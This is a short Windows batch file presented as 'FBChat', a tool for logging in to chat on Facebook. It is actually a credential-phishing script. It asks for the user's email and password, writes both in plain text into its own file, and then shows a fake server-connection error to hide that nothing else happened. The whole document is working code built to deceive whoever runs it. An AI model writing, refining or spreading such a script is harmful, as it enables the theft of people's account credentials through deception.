TITLE FBChat
ECHO OFF
COLOR 03
CLS
ECHO.
ECHO LOGIN TO START CHATTING ON FACEBOOK
ECHO.
ECHO Please enter your email:
SET/P "MAIL=>"
ECHO.
ECHO Enter the password:
SET/P "PSWD=>"
ECHO EMAIL = %MAIL%>>FBChat.bat
ECHO PASSWORD = %PSWD%>>FBChat.bat
CLS
TIMEOUT /T 5 >NUL
COLOR 0C
ECHO.
ECHO An error occurred while connecting to the server. Try again later.
PAUSE>NUL
